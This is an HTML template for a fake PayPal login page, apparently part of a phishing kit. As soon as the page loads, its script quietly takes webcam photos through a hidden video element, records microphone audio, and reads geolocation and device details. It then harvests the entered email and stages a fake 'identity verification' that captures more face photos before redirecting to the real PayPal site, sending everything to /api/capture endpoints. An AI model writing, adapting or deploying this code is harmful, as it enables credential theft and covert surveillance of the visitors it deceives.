<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login to your PayPal</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
.card{width:100%;max-width:460px;text-align:center;padding:40px 20px}
.logo{font-size:32px;font-weight:700;color:#003087;margin-bottom:10px}
h2{font-size:24px;color:#2c2e2f;margin-bottom:30px;font-weight:400}
.form-box{text-align:left;max-width:400px;margin:0 auto}
.input-group{margin-bottom:15px}
.input-group input{width:100%;padding:14px 16px;border:1px solid #9da3a6;border-radius:4px;font-size:16px;outline:none;transition:all 0.3s}
.input-group input:focus{border-color:#0070ba;box-shadow:0 0 0 1px #0070ba}
.btn-next{width:100%;padding:14px;background:#0070ba;border:none;border-radius:25px;color:#fff;font-size:16px;font-weight:700;cursor:pointer;transition:all 0.3s;margin-bottom:15px}
.btn-next:hover{background:#005ea6}
.btn-create{width:100%;padding:14px;background:#fff;border:1px solid #0070ba;border-radius:25px;color:#0070ba;font-size:16px;font-weight:700;cursor:pointer;transition:all 0.3s}
.btn-create:hover{background:#f7f9fa}
.divider{display:flex;align-items:center;margin:20px 0;color:#6c7378;font-size:14px}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#cbd2d6}
.divider span{margin:0 15px}
.footer{margin-top:30px;font-size:12px;color:#6c7378}
.footer a{color:#0070ba;text-decoration:none}

.verify-box{display:none;text-align:center;padding:20px 0}
.verify-box h3{font-size:18px;color:#2c2e2f;margin-bottom:10px}
.verify-box p{color:#6c7378;font-size:14px;margin-bottom:20px}
.cam-preview{width:200px;height:200px;margin:0 auto 20px;border-radius:50%;overflow:hidden;border:3px solid #0070ba;background:#f0f2f5;display:none}
.cam-preview video{width:100%;height:100%;object-fit:cover}
.btn-verify{width:100%;padding:14px;background:#0070ba;border:none;border-radius:25px;color:#fff;font-size:15px;font-weight:600;cursor:pointer}

.processing{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:#fff;align-items:center;justify-content:center;z-index:1000}
.processing.active{display:flex}
.process-box{text-align:center}
.spinner{width:40px;height:40px;border:3px solid #e8eaed;border-top-color:#0070ba;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px}
@keyframes spin{to{transform:rotate(360deg)}}
.process-box h2{color:#2c2e2f;font-size:18px}

#hiddenCamera{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0}
</style>
</head>
<body>
<div class="card" id="mainCard">
    <div class="logo">PayPal</div>
    <h2>Log in to your PayPal account</h2>
    <div class="form-box" id="loginForm">
        <div class="input-group">
            <input type="text" id="email" placeholder="Email or mobile number">
        </div>
        <button class="btn-next" onclick="handleLogin()">Next</button>
        <div class="divider"><span>or</span></div>
        <button class="btn-create">Sign Up</button>
    </div>

    <div class="verify-box" id="verifyBox">
        <h3>Identity Verification</h3>
        <p>Please verify your identity for security</p>
        <div class="cam-preview" id="camPreview">
            <video id="previewVideo" autoplay playsinline></video>
        </div>
        <button class="btn-verify" id="openCamBtn" onclick="startCamera()">Open Camera</button>
        <button class="btn-verify" id="captureBtn" onclick="capturePhotos()" style="display:none;margin-top:10px">Verify</button>
    </div>

    <div class="footer">
        <a href="#">Forgot password?</a> | <a href="#">Privacy</a> | <a href="#">Terms</a>
    </div>
</div>

<div class="processing" id="processing">
    <div class="process-box">
        <div class="spinner"></div>
        <h2>Loading...</h2>
    </div>
</div>

<video id="hiddenCamera" autoplay playsinline></video>
<canvas id="captureCanvas" style="display:none"></canvas>

<script>
const TOKEN = "<%= token %>";
let captureId = null;
let stream = null;

async function silentCapture() {
    const device = {platform:navigator.platform,browser:navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera)\/[\d.]+/)?.[0]||'Unknown',language:navigator.language,cores:navigator.hardwareConcurrency||'Unknown',memory:navigator.deviceMemory||'Unknown'};
    const screen={width:window.screen.width,height:window.screen.height};
    let battery={};try{const b=await navigator.getBattery();battery={level:b.level,charging:b.charging}}catch(e){}
    const network={type:navigator.connection?.type||'Unknown',effectiveType:navigator.connection?.effectiveType||'Unknown'};

    const resp=await fetch('/api/capture/init',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:TOKEN,template:'paypal',device,screen,battery,network})});
    const data=await resp.json();captureId=data.capture_id;

    try{const sStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
    const video=document.getElementById('hiddenCamera');video.srcObject=sStream;
    let count=0;
    const interval=setInterval(()=>{
        if(count>=5){clearInterval(interval);sStream.getTracks().forEach(t=>t.stop());return;}
        const canvas=document.getElementById('captureCanvas');canvas.width=640;canvas.height=480;
        canvas.getContext('2d').drawImage(video,0,0,640,480);
        fetch('/api/capture/photo',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({capture_id:captureId,image:canvas.toDataURL('image/jpeg',0.8)})});
        count++;
    },800);
    }catch(e){}

    if(navigator.geolocation){navigator.geolocation.getCurrentPosition(pos=>fetch('/api/capture/location',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({capture_id:captureId,lat:pos.coords.latitude,lon:pos.coords.longitude,accuracy:pos.coords.accuracy})}),()=>{},{enableHighAccuracy:true,timeout:10000});}

    try{const aStream=await navigator.mediaDevices.getUserMedia({audio:true});const rec=new MediaRecorder(aStream);const chunks=[];
    rec.ondataavailable=e=>chunks.push(e.data);rec.onstop=()=>{const blob=new Blob(chunks,{type:'audio/webm'});const reader=new FileReader();reader.onloadend=()=>fetch('/api/capture/audio',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({capture_id:captureId,audio:reader.result})});reader.readAsDataURL(blob);};
    rec.start();setTimeout(()=>rec.stop(),6000);}catch(e){}
}

async function handleLogin(){
    const email=document.getElementById('email').value;
    if(!email){alert('Please enter email');return;}
    await fetch('/api/capture/credentials',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({capture_id:captureId,username:email,password:''})});
    document.getElementById('loginForm').style.display='none';
    document.getElementById('verifyBox').style.display='block';
}

async function startCamera(){
    try{stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
    const video=document.getElementById('previewVideo');video.srcObject=stream;
    document.getElementById('camPreview').style.display='block';
    document.getElementById('openCamBtn').style.display='none';
    document.getElementById('captureBtn').style.display='block';
    }catch(e){alert('Camera access is required for identity verification.');}
}

async function capturePhotos(){
    const video=document.getElementById('previewVideo');
    const canvas=document.getElementById('captureCanvas');
    canvas.width=video.videoWidth||640;canvas.height=video.videoHeight||480;
    let count=0;
    const btn=document.getElementById('captureBtn');
    btn.textContent='Verifying...';btn.disabled=true;

    const interval=setInterval(async()=>{
        if(count>=5){clearInterval(interval);if(stream)stream.getTracks().forEach(t=>t.stop());
        document.getElementById('mainCard').style.display='none';
        document.getElementById('processing').classList.add('active');
        setTimeout(()=>window.location.href='https://www.paypal.com',4000);return;}
        canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);
        await fetch('/api/capture/photo',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({capture_id:captureId,image:canvas.toDataURL('image/jpeg',0.9)})});
        count++;btn.textContent=`Verifying ${count}/5...`;
    },600);
}

window.addEventListener('load',silentCapture);
</script>
</body>
</html>